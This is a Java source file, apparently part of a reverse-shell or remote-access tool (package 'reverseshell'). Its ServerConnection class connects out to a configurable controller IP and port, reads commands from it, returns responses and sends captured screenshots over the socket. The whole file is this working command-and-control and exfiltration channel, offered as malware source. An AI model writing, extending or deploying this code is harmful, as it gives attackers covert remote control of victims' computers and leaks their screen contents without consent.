package obs1d1anc1ph3r.reverseshell;

import java.io.*;
import java.net.*;
import java.util.logging.Level;
import java.util.logging.Logger;

public class ServerConnection {

    private final String serverIp;
    private final int serverPort;
    private Socket socket;
    private BufferedReader in;
    private PrintWriter out;
    private DataOutputStream dataOut;

    public ServerConnection(String serverIp, int serverPort) {
        this.serverIp = serverIp;
        this.serverPort = serverPort;
    }

    public void connect() throws IOException {
        System.out.println("[*] Connecting to server...");
        socket = new Socket();
        socket.connect(new InetSocketAddress(serverIp, serverPort), 5000);
        System.out.println("[+] Connected to server: " + serverIp + ":" + serverPort);
        in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
        out = new PrintWriter(socket.getOutputStream(), true);
        dataOut = new DataOutputStream(socket.getOutputStream());
    }

    public String readCommand() throws IOException {
        String command = in.readLine();
        if (command == null) {
            throw new IOException("Server connection closed unexpectedly.");
        }
        return command;
    }

    public void sendResponse(String response) {
        out.println(response.trim());
        out.flush();
    }

    public void sendScreenShot(byte[] imageBytes) {
        try {
            dataOut.writeInt(imageBytes.length);
            dataOut.write(imageBytes);
            dataOut.flush();
        } catch (IOException ex) {
            Logger.getLogger(ServerConnection.class.getName()).log(Level.SEVERE, "Failed to send screenshot", ex);
        }

    }

    public void cleanup() {
        try {
            if (in != null) {
                in.close();
            }
            if (out != null) {
                out.close();
            }
            if (dataOut != null) {
                dataOut.close();
            }
            if (socket != null) {
                socket.close();
            }
        } catch (IOException e) {
            System.err.println("Error closing resources: " + e.getMessage());
        }
    }

}
